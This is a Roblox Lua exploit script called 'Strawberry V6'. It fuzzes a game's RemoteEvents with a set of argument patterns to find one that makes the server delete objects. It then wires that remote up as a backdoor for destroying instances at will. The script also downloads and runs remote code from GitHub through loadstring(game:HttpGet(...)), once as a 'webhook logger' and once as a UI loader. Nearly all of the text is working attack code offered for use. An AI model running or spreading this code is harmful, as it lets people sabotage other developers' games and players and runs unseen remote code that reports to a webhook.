--[[
⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⢀⠀⠀
⠀⠀⠀⠀⠀⠀⣏⠓⠒⠤⣰⠋⠹⡄⠀⣠⠞⣿⠀⠀
⠀⠀⠀⢀⠄⠂⠙⢦⡀⠐⠨⣆⠁⣷⣮⠖⠋⠉⠁⠀
⠀⠀⡰⠁⠀⠮⠇⠀⣩⠶⠒⠾⣿⡯⡋⠩⡓⢦⣀⡀
⠀⡰⢰⡹⠀⠀⠲⣾⣁⣀⣤⠞⢧⡈⢊⢲⠶⠶⠛⠁
⢀⠃⠀⠀⠀⣌⡅⠀⢀⡀⠀⠀⣈⠻⠦⣤⣿⡀⠀⠀
⠸⣎⠇⠀⠀⡠⡄⠀⠷⠎⠀⠐⡶⠁⠀⠀⣟⡇⠀⠀
⡇⠀⡠⣄⠀⠷⠃⠀⠀⡤⠄⠀⠀⣔⡰⠀⢩⠇⠀⠀
⡇⠀⠻⠋⠀⢀⠤⠀⠈⠛⠁⠀⢀⠉⠁⣠⠏⠀⠀⠀
⣷⢰⢢⠀⠀⠘⠚⠀⢰⣂⠆⠰⢥⡡⠞⠁⠀⠀⠀⠀
⠸⣎⠋⢠⢢⠀⢠⢀⠀⠀⣠⠴⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠘⠷⣬⣅⣀⣬⡷⠖⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠁⠀

Strawberry V6
Scanner rewritten and finalized by sane.
This is the definitive version.
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
]]--

-- //===================[ CONFIG ]===================//

local Config = {
	ScanSafeTime = 0.1, -- // Fast, we're dodging not crawling.
	ShowScannerProgress = true,
	EnableGUIAfterScan = true,
	ExecutorName = getexecutorname and getexecutorname() or "Unknown",
    BlacklistedRemotes = {
        -- // Add the full path of any remote that kicks you here.
        -- // Example: "Workspace.AntiCheat.KickRemote"
    }
}

-- //===================[ CORE ]===================//

local backdoorFound = false
local vulnerableRemote = nil
local fireWrapper = nil
local scanStartTime = tick()

local Services = {
	Players = game:GetService("Players"),
	ReplicatedStorage = game:GetService("ReplicatedStorage"),
	HttpService = game:GetService("HttpService"),
	StarterGui = game:GetService("StarterGui"),
	CoreGui = game:GetService("CoreGui"),
	Workspace = game:GetService("Workspace"),
	Debris = game:GetService("Debris"),
	RunService = game:GetService("RunService")
}

local LocalPlayer = Services.Players.LocalPlayer
local Hint = Instance.new("Hint", Services.Workspace)
Hint.Text = "STRAWBERRY V6: Scanning, be very patient. (Game might freeze)"

local function Notify(message, duration)
	pcall(function()
		Services.StarterGui:SetCore("SendNotification", {
			Title = "Strawberry V6",
			Text = tostring(message),
			Duration = duration or 5
		})
	end)
end

local function FireBackdoor(instance)
	if not backdoorFound or not fireWrapper then
		print("Strawberry: FireBackdoor called but no backdoor is loaded, what the fuck")
		return
	end
	pcall(fireWrapper, instance)
end

if LocalPlayer:FindFirstChild("deletebind") then
	LocalPlayer.deletebind:Destroy()
end
local deleteBind = Instance.new("BindableEvent", LocalPlayer)
deleteBind.Name = "deletebind"
deleteBind.Event:Connect(FireBackdoor)

-- //===================[ WEBHOOK LOGGER ]===================//

local function SendWebhook()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/refs/heads/main/Hook.lua"))();
end

-- //===================[ THE SCANNER ]===================//

-- // sane's definitive rewrite. this is how you eliminate false positives.
local function IsVulnerable(remote)
	local char = LocalPlayer.Character
	if not char then return false end

	-- // find a reliable test subject
	local testSubject = char:FindFirstChild("Animate") or LocalPlayer.StarterGear or char:FindFirstChild("RightHand")
	if not testSubject then
		-- // if we can't find anything to test with, we can't test. simple.
		return false
	end

	-- // The Control Group Method:
	-- // testClone1 is the target. testClone2 is the control.
	local testClone1 = testSubject:Clone()
	testClone1.Name = "STRAWBERRY_TARGET_" .. Services.HttpService:GenerateGUID(false)
	testClone1.Parent = char
	local testClone2 = testSubject:Clone()
	testClone2.Name = "STRAWBERRY_CONTROL_" .. Services.HttpService:GenerateGUID(false)
	testClone2.Parent = char

	Services.Debris:AddItem(testClone1, 3)
	Services.Debris:AddItem(testClone2, 3)

	local destroyed1 = false
	local destroyed2 = false

	local connection1 = testClone1.AncestryChanged:Connect(function(_, parent)
		if not parent then destroyed1 = true end
	end)
	local connection2 = testClone2.AncestryChanged:Connect(function(_, parent)
		if not parent then destroyed2 = true end
	end)

	local fuzzPatterns = {
		function() remote:FireServer(testClone1) end,
		function() remote:FireServer(nil, testClone1) end,
		function() remote:FireServer(nil, nil, testClone1) end,
		function() remote:FireServer({testClone1}) end,
		function() remote:FireServer({Target = testClone1}) end,
		function() remote:FireServer("Destroy", testClone1) end,
		function() remote:FireServer("delete", testClone1) end,
		function() remote:FireServer("remove", testClone1) end,
		function() remote:FireServer({action = "delete", object = testClone1}) end,
		function() remote:FireServer(testClone1.Name) end
	}

	for i, patternFunc in ipairs(fuzzPatterns) do
		pcall(patternFunc)
		task.wait(Config.ScanSafeTime + (math.random(5, 20) / 100)) -- randomized micro-delay

		if destroyed1 and not destroyed2 then
			print("STRAWBERRY V6: HIGH-CONFIDENCE VULNERABILITY CONFIRMED! Pattern #" .. i)
			fireWrapper = function(instance)
				local newPattern = {
					function() remote:FireServer(instance) end,
					function() remote:FireServer(nil, instance) end,
					function() remote:FireServer(nil, nil, instance) end,
					function() remote:FireServer({instance}) end,
					function() remote:FireServer({Target = instance}) end,
					function() remote:FireServer("Destroy", instance) end,
					function() remote:FireServer("delete", instance) end,
					function() remote:FireServer("remove", instance) end,
					function() remote:FireServer({action = "delete", object = instance}) end,
					function() remote:FireServer(instance.Name) end
				}
				pcall(newPattern[i])
			end
			connection1:Disconnect()
			connection2:Disconnect()
			if testClone1 and testClone1.Parent then testClone1:Destroy() end
			if testClone2 and testClone2.Parent then testClone2:Destroy() end
			return true
		end
	end

	connection1:Disconnect()
	connection2:Disconnect()
	if testClone1 and testClone1.Parent then testClone1:Destroy() end
	if testClone2 and testClone2.Parent then testClone2:Destroy() end
	return false
end


local function ScanForBackdoor()
	local locationsToScan = {
		Services.ReplicatedStorage,
		Services.Workspace,
		Services.StarterGui,
		game:GetService("Lighting"),
		LocalPlayer.PlayerGui
	}

	local blacklist = {}
	for _, path in ipairs(Config.BlacklistedRemotes) do
		blacklist[path] = true
	end

	for _, root in ipairs(locationsToScan) do
		if backdoorFound then break end
		if Config.ShowScannerProgress then Hint.Text = "STRAWBERRY V6: Fuzzing remotes in " .. root:GetFullName() end

		for _, remote in ipairs(root:GetDescendants()) do
			if remote:IsA("RemoteEvent") then
				local remotePath = remote:GetFullName()
				print("STRAWBERRY V6: Scanning -> " .. remotePath)

				if not remote.Parent or blacklist[remotePath] or remotePath:match("Chat") or remote.Parent.Name == "RobloxReplicatedStorage" then
					if blacklist[remotePath] then
						print("STRAWBERRY V6: Skipping blacklisted remote -> " .. remotePath)
					end
					continue
				end

				if IsVulnerable(remote) then
					backdoorFound = true
					vulnerableRemote = remote
					return
				end
			end
		end
	end
end

-- //===================[ SCRIPT EXECUTION ]===================//

task.wait(1)
ScanForBackdoor()

if backdoorFound then
	Hint.Text = "STRAWBERRY V6: Backdoor located in " .. string.format("%.2f", tick() - scanStartTime) .. "s. Remote: " .. vulnerableRemote.Name
	Notify("Backdoor found: " .. vulnerableRemote:GetFullName(), 10)
	SendWebhook()

	if Config.EnableGUIAfterScan then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/C-Dr1ve/Strawberry/main/UI_Source/v6.lua"))()
	end

	task.wait(10)
	Hint:Destroy()
else
	Hint.Text = "STRAWBERRY V6: No backdoor found. Game dev aint dumb."
	Notify("Scan complete. No vulnerable remotes found. Lame.", 10)
	task.wait(10)
	Hint:Destroy()
end
